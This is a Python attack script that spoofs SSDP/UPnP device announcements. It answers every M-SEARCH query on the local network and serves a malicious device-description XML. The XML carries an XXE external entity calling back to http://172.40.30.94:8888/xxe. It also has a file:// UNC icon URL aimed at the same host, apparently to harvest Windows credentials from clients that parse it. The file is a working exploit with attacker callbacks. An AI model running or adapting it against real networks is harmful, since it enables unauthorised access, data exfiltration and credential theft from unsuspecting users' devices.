#!/usr/bin/env python3

import socket
import struct
import sys
import time
import re
from http.server import BaseHTTPRequestHandler
from email.utils import formatdate

# Set up some nice colors
class bcolors:
    GREEN = '\033[92m'
    BLUE = '\033[94m'
    ORANGE = '\033[93m'
    ENDC = '\033[0m'
okBox = bcolors.BLUE + '[*] ' + bcolors.ENDC
noteBox = bcolors.GREEN + '[+] ' + bcolors.ENDC
warnBox = bcolors.ORANGE + '[!] ' + bcolors.ENDC

class SSDPListener:
    def __init__(self, localIp, localPort, serverName):
        self.sock = None
        self.knownHosts = []
        self.localIp = localIp
        self.localPort = localPort
        self.serverName = serverName
    def run(self):
        ssdpPort = 1900			# This is defined by the SSDP spec, do not change
        mcastGroup='239.255.255.250'	# This is defined by the SSDP spec, do not change
        serverAddress = ('', ssdpPort)
        knownHosts = []
        
        # Create the socket
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        #self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Bind to the server address
        self.sock.bind(serverAddress)
        
        # Tell the operating system to add the socket to
        # the multicast group on for the interface on the specific IP.
        group = socket.inet_aton(mcastGroup)
        mreq = struct.pack('4s4s', group, socket.inet_aton(self.localIp))
        self.sock.setsockopt(
            socket.IPPROTO_IP,
            socket.IP_ADD_MEMBERSHIP,
            mreq)
        
        # Receive/respond loop
        while True:
            data, address = self.sock.recvfrom(1024)
            self.process_data(data,address)

    def process_data(self, data, address):
        (remoteIp,remotePort) = address
        if 'M-SEARCH' in str(data):
            #print(str(data))                    # DEBUG
            requestedST = re.findall(r'\\r\\nST:(.*?)\\r\\n', str(data))[0].strip() or 'upnp:rootdevice'
            if address[0] not in self.knownHosts:
                print(noteBox + "Received an M-SEARCH query from new host {} on port {}".format(remoteIp, remotePort))
                self.knownHosts.append(address[0])
                print("    " + okBox + "Replying with the ST of " + requestedST)
            self.send_location(address, requestedST)

    def send_location(self, address, requestedST):
        URL = 'http://{}:{}/ssdp/device-desc.xml'.format(self.localIp, self.localPort)
        lastSeen = str(time.time())
        dateFormat = formatdate(timeval=None, localtime=False, usegmt=True)
        reply = 'HTTP/1.1 200 OK\r\n'
        reply += 'CACHE-CONTROL: max-age=1800\r\n'
        reply += 'DATE: ' + dateFormat + '\r\n'
        reply += 'EXT: \r\n'
        reply += 'LOCATION: ' + URL + '\r\n'
        reply += 'SERVER: Linux/3.10.96+, UPnP/1.0, eSSDP/0.1\r\n'
        reply += 'ST: {}\r\n'.format(requestedST)
        reply += 'USN: uuid:e415ce0a-3e62-22d0-ad3f-42ec42e36563:upnp-rootdevice\n'
        reply += 'BOOTID.UPNP.ORG: 0\r\n'
        reply += 'CONFIGID.UPNP.ORG: 1\r\n'
        reply += '\r\n\r\n'
        reply = bytes(reply, 'utf-8')
        self.sock.sendto(reply, address)

class DeviceDescriptor(BaseHTTPRequestHandler):
    
    def do_GET(self):
        xmlFile = self.buildXml()
        if self.path == '/ssdp/device-desc.xml':
            self.send_response(200)
            self.send_header('Content-type', 'application/xml')
            self.end_headers()
            self.wfile.write(xmlFile.encode())
            print(self.headers)  # For debugging, ok to remove.

    def buildXml(self):
        xmlFile = '''<!DOCTYPE foo [
    <!ELEMENT friendlyName ANY >
    <!ENTITY xxe SYSTEM "http://172.40.30.94:8888/xxe" >]>
    <root>
    <specVersion>
        <major>1</major>
        <minor>0</minor>
    </specVersion>
    <device>
        <deviceType>urn:schemas-upnp-org:device:Basic:1</deviceType>
        <friendlyName>&xxe;</friendlyName>
        <manufacturer>eCorp</manufacturer>
        <manufacturerURL>http://ecorp.co</manufacturerURL>
        <modelDescription>eMedia Server</modelDescription>
        <modelName>Black Edition</modelName>
        <modelNumber>666</modelNumber>
        <modelURL>http://ecorp.co/model666</modelURL>
        <serialNumber>1337</serialNumber>
        <UDN>uuid:e415ce0a-3e62-22d0-ad3f-42ec42e36563</UDN>
        <serviceList>
            <service>
                <URLBase>http://xxx.yyy.zzz.aaaa:5000</URLBase>
                <serviceType>urn:boucherie.example.com:service:Jambon:1</serviceType>
                <serviceId>urn:boucherie.example.com:serviceId:Jambon</serviceId>
                <controlURL>/jambon</controlURL>
                <eventSubURL/>
                <SCPDURL>/boucherie_wsd.xml</SCPDURL>
            </service>
        </serviceList>
        <presentationURL>http://localhost</presentationURL>
        <iconList><icon>
            <mimetype>image/png</mimetype>
            <width>93</width>
            <height>45</height>
            <depth>32</depth>
            <url>file://///172.40.30.94/icon.png</url>
            </icon></iconList>
    </device>
    </root>'''
        return xmlFile

    #def log_message(self, format, *args):
    #    print(noteBox + "Someone took the bait!")
